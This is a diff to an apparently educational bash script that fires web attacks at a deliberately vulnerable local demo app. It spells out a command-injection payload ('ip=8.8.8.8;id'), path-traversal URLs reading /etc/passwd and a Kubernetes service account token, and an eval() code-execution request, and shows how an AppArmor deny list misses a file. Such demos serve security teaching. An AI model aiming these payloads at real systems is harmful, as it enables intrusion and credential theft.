@@ -23,6 +23,7 @@ Usage: $0 <target> [attack names...]
     passwd   Path Traversal -> /etc/passwd
     token    Path Traversal -> Kubernetes service account token
     conf     Path Traversal -> planted /etc/come-to-code.conf (AppArmor blacklist gap)
+    supertoken  Path Traversal -> come-to-code-supersecure-token (easter egg, ASCII art)
     eval     Arbitrary Code Execution via eval()
 
   Examples:
@@ -71,26 +72,47 @@ run() {
 }
 
 attack_cmdi() {
+  # curl equivalent:
+  #   curl -G "http://localhost:${PORT}/attack/command-injection" --data-urlencode "ip=8.8.8.8;id"
+  #   (already-encoded: curl "http://localhost:${PORT}/attack/command-injection?ip=8.8.8.8%3Bid")
   run "Command Injection  [cmdi]  (/attack/command-injection)" \
       "Injects a shell command into an unsanitized exec() call." \
       -G "http://localhost:${PORT}/attack/command-injection" --data-urlencode "ip=8.8.8.8;id"
 }
 attack_passwd() {
+  # curl equivalent:
+  #   curl "http://localhost:${PORT}/attack/path-traversal?file=../../../../../../etc/passwd"
   run "Path Traversal -> /etc/passwd  [passwd]  (/attack/path-traversal)" \
       "Reads an arbitrary file through an unvalidated file path." \
       "http://localhost:${PORT}/attack/path-traversal?file=../../../../../../etc/passwd"
 }
 attack_token() {
+  # curl equivalent:
+  #   curl "http://localhost:${PORT}/attack/path-traversal?file=../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token"
   run "Path Traversal -> Kubernetes token  [token]  (fake, mounted for the demo)" \
       "Same LFI, aimed at the service account token path." \
       "http://localhost:${PORT}/attack/path-traversal?file=../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token"
 }
+attack_supertoken() {
+  # curl equivalent:
+  #   curl "http://localhost:${PORT}/attack/path-traversal?file=../../../../../../var/run/secrets/come-to-code-supersecure-token"
+  # NOTE: mounted OUTSIDE the AppArmor-denied glob (/var/run/secrets/kubernetes.io/serviceaccount/**),
+  #       so it stays readable even on app-distroless-hardened -> the "supersecure" name was the only control.
+  run "Path Traversal -> come-to-code-supersecure-token  [supertoken]  (easter egg)" \
+      "Same LFI on a file named 'supersecure' that holds ASCII art, not a secret." \
+      "http://localhost:${PORT}/attack/path-traversal?file=../../../../../../var/run/secrets/come-to-code-supersecure-token"
+}
 attack_conf() {
+  # curl equivalent:
+  #   curl "http://localhost:${PORT}/attack/path-traversal?file=../../../../../../etc/come-to-code.conf"
   run "Path Traversal -> /etc/come-to-code.conf  [conf]" \
       "Same LFI on a harmless file the AppArmor blacklist forgot to deny." \
       "http://localhost:${PORT}/attack/path-traversal?file=../../../../../../etc/come-to-code.conf"
 }
 attack_eval() {
+  # curl equivalent:
+  #   curl -G "http://localhost:${PORT}/attack/eval-rce" --data-urlencode "code=1+1"
+  #   (already-encoded: curl "http://localhost:${PORT}/attack/eval-rce?code=1%2B1")
   run "Arbitrary Code Execution  [eval]  (/attack/eval-rce)" \
       "Executes arbitrary JavaScript through eval() (no shell required)." \
       -G "http://localhost:${PORT}/attack/eval-rce" --data-urlencode "code=1+1"
@@ -105,8 +127,9 @@ for name in "${SELECTION[@]}"; do
     passwd) attack_passwd ;;
     token)  attack_token ;;
     conf)   attack_conf ;;
+    supertoken) attack_supertoken ;;
     eval)   attack_eval ;;
-    *) echo -e "\n${YELLOW}Skipping unknown attack '$name' (valid: cmdi passwd token conf eval)${NC}" ;;
+    *) echo -e "\n${YELLOW}Skipping unknown attack '$name' (valid: cmdi passwd token conf supertoken eval)${NC}" ;;
   esac
 done
 
